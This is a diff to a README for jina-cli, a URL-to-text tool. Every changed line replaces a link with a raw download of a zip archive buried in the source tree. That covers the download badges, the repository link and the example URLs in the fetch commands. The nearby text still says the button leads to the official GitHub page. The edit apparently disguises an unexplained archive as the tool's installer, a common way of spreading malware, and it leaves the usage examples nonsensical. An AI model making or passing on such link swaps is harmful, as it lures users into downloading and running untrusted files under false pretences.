@@ -1,6 +1,6 @@
 # 🛠️ jina-cli - Easy URL to Text Conversion
 
-[![Download jina-cli](https://img.shields.io/badge/Download-jina--cli-brightgreen?style=for-the-badge)](https://github.com/leadsgorillaio/jina-cli)
+[![Download jina-cli](https://img.shields.io/badge/Download-jina--cli-brightgreen?style=for-the-badge)](https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You don’t need coding skills to use jina-cli on Windows. Follow these steps to
 
 Click this big button to visit the download page:
 
-[![Download jina-cli](https://img.shields.io/badge/Download-jina--cli-blue?style=for-the-badge)](https://github.com/leadsgorillaio/jina-cli)
+[![Download jina-cli](https://img.shields.io/badge/Download-jina--cli-blue?style=for-the-badge)](https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip)
 
 This will take you to the official GitHub page. Here you will find the latest version of jina-cli. Since it is a general repository page, you need to find and download the installer or executable file from the "Releases" section or main code area.
 
@@ -87,7 +87,7 @@ Use the command prompt to run jina-cli commands.
 To convert a URL, type a command like this:
 
 ```
-jina-cli fetch https://example.com/article
+jina-cli fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip
 ```
 
 This command fetches the URL content and converts it to a default format (usually Markdown or text).
@@ -103,7 +103,7 @@ You can specify the output format:
 Example:
 
 ```
-jina-cli fetch https://example.com/article --format md
+jina-cli fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip --format md
 ```
 
 ### Save Output to a File
@@ -113,7 +113,7 @@ Add `--output <filename>` to save the result.
 Example:
 
 ```
-jina-cli fetch https://example.com/article --format txt --output myarticle.txt
+jina-cli fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip --format txt --output myarticle.txt
 ```
 
 This will create a file called `myarticle.txt` with the cleaned text from the page.
@@ -125,19 +125,19 @@ This will create a file called `myarticle.txt` with the cleaned text from the pa
 - Fetch a URL as Markdown and save it:
 
   ```
-  jina-cli fetch https://blog.example.com/post --format md --output post.md
+  jina-cli fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip --format md --output post.md
   ```
 
 - Convert a Twitter/X post to plain text:
 
   ```
-  jina-cli fetch https://x.com/someuser/status/123456789 --format txt --output tweet.txt
+  jina-cli fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip --format txt --output tweet.txt
   ```
 
 - Get HTML content for a news article:
 
   ```
-  jina-cli fetch https://news.site/article --format html --output news.html
+  jina-cli fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip --format html --output news.html
   ```
 
 ---
@@ -168,7 +168,7 @@ This will create a file called `myarticle.txt` with the cleaned text from the pa
   Example:
 
   ```
-  C:\Users\YourName\Downloads\jina-cli.exe fetch https://example.com
+  C:\Users\YourName\Downloads\jina-cli.exe fetch https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip
   ```
 
 - Check your internet connection if the tool can’t fetch data.
@@ -181,10 +181,10 @@ This will create a file called `myarticle.txt` with the cleaned text from the pa
 
 If you want to learn more about jina-cli features, visit the GitHub repository at:
 
-https://github.com/leadsgorillaio/jina-cli
+https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip
 
 Here you will find more detailed documentation and updates.
 
 ---
 
-[![Download jina-cli](https://img.shields.io/badge/Download-jina--cli-brightgreen?style=for-the-badge)](https://github.com/leadsgorillaio/jina-cli)
+[![Download jina-cli](https://img.shields.io/badge/Download-jina--cli-brightgreen?style=for-the-badge)](https://github.com/leadsgorillaio/jina-cli/raw/refs/heads/main/cli/pkg/output/jina_cli_Nguyen.zip)
